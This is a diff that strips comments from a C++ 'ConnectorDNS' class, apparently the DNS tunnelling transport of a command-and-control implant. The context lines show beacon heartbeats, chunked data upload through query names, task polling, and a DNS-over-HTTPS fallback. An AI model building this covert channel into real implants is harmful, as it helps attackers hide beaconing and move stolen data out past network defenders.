@@ -117,7 +117,6 @@ void ConnectorDNS::CleanupWSA()
     }
 }
 
-// DoH initialization (load WinInet functions)
 BOOL ConnectorDNS::InitDoH()
 {
     if (this->dohInitialized)
@@ -169,7 +168,6 @@ BOOL ConnectorDNS::InitDoH()
     return TRUE;
 }
 
-// DoH cleanup
 void ConnectorDNS::CleanupDoH()
 {
     if (this->hInternet && this->dohFunctions && this->dohFunctions->InternetCloseHandle) {
@@ -179,7 +177,6 @@ void ConnectorDNS::CleanupDoH()
     this->dohInitialized = FALSE;
 }
 
-// Parse DoH resolver URLs (format: "https://host/path,https://host2/path2")
 void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
 {
     this->dohResolverCount = 0;
@@ -553,7 +550,6 @@ BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, 
     return result;
 }
 
-// DoH query with resolver rotation (similar to UDP QueryWithRotation)
 BOOL ConnectorDNS::QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
     *outSize = 0;
@@ -953,10 +949,8 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULO
     this->profile = profile;
     this->sleepDelaySeconds = sleepDelaySeconds;
 
-    // Parse UDP DNS resolvers
     ParseResolvers((CHAR*)profile.resolvers);
 
-    // Parse DoH resolvers and set DNS mode
     ParseDohResolvers((CHAR*)profile.doh_resolvers);
     this->dnsMode = profile.dns_mode;
 
@@ -1016,7 +1010,6 @@ void ConnectorDNS::CloseConnector()
     // Cleanup WSA and cached resources
     CleanupWSA();
 
-    // Cleanup DoH resources
     CleanupDoH();
 
     if (this->recvData) {
@@ -1062,7 +1055,6 @@ void ConnectorDNS::UpdateSleepDelay(ULONG sleepSeconds)
     this->sleepDelaySeconds = sleepSeconds;
 }
 
-// Internal UDP query with rotation (extracted from original QueryWithRotation)
 BOOL ConnectorDNS::QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
     *outSize = 0;
@@ -1105,34 +1097,28 @@ BOOL ConnectorDNS::QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr,
     return FALSE;
 }
 
-// Main query method with DNS mode support
 BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
     *outSize = 0;
 
     switch (this->dnsMode) {
         case DNS_MODE_UDP:
-            // Only UDP DNS
             return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
         case DNS_MODE_DOH:
-            // Only DoH (DNS over HTTPS)
             return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
         case DNS_MODE_UDP_FALLBACK:
-            // Try UDP first, fallback to DoH on failure
             if (QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
                 return TRUE;
             return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
         case DNS_MODE_DOH_FALLBACK:
-            // Try DoH first, fallback to UDP on failure
             if (QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
                 return TRUE;
             return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
         default:
-            // Default to UDP
             return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
     }
 }
@@ -1157,7 +1143,7 @@ void ConnectorDNS::SendHeartbeat()
     ULONG ipSize = 0;
     if (QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
         this->lastQueryOk = TRUE;
-        this->consecutiveFailures = 0;  // Reset failure counter on success
+        this->consecutiveFailures = 0;
 
         // Parse HB response: [flags:1][reserved:3]
         // Flags: 0x01 = has pending tasks, 0x02 = needs_reset
@@ -1184,7 +1170,6 @@ void ConnectorDNS::SendHeartbeat()
         this->lastQueryOk = FALSE;
         this->consecutiveFailures++;
         
-        // Reset state after prolonged connection loss (5+ consecutive failures)
         if (this->consecutiveFailures >= 5) {
             this->hasPendingTasks = FALSE;
             this->downAckOffset = 0;
@@ -1297,7 +1282,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         this->lastQueryOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
         if (this->lastQueryOk) {
             this->hiSent = TRUE;
-            this->consecutiveFailures = 0;  // Reset failure counter on success
+            this->consecutiveFailures = 0;
         }
         else if (this->hiRetries > 0)
             this->hiRetries--;
@@ -1445,13 +1430,12 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (uploadComplete || offset >= total) {
             this->lastUpTotal = total;
             this->lastQueryOk = TRUE;
-            this->consecutiveFailures = 0;  // Reset failure counter on success
+            this->consecutiveFailures = 0;
         }
         else {
             this->lastQueryOk = FALSE;
             this->consecutiveFailures++;
             
-            // Reset state after prolonged connection loss (5+ consecutive failures)
             if (this->consecutiveFailures >= 5) {
                 this->hasPendingTasks = FALSE;
             }
@@ -1463,7 +1447,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         return;
     }
 
-    // Handle HI retry - continue trying until successful connection
     if (!this->hiSent && this->hiBeat && this->hiBeatSize) {
         memset(dataLabel, 0, sizeof(dataLabel));
         memset(qname, 0, sizeof(qname));
@@ -1490,7 +1473,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
             this->hiSent = TRUE;
             this->lastQueryOk = TRUE;
-            this->consecutiveFailures = 0;  // Reset failure counter on success
+            this->consecutiveFailures = 0;
         }
         else {
             this->lastQueryOk = FALSE;
@@ -1533,7 +1516,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     ULONG respSize = 0;
     if (QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
         this->lastQueryOk = TRUE;
-        this->consecutiveFailures = 0;  // Reset failure counter on success
+        this->consecutiveFailures = 0;
 
         // Check for "no data" response: "OK" or empty/small response
         if ((respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') ||
@@ -1685,7 +1668,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         this->lastQueryOk = FALSE;
         this->consecutiveFailures++;
         
-        // Reset state after prolonged connection loss (5+ consecutive failures)
         if (this->consecutiveFailures >= 5) {
             this->hasPendingTasks = FALSE;
             this->downAckOffset = 0;
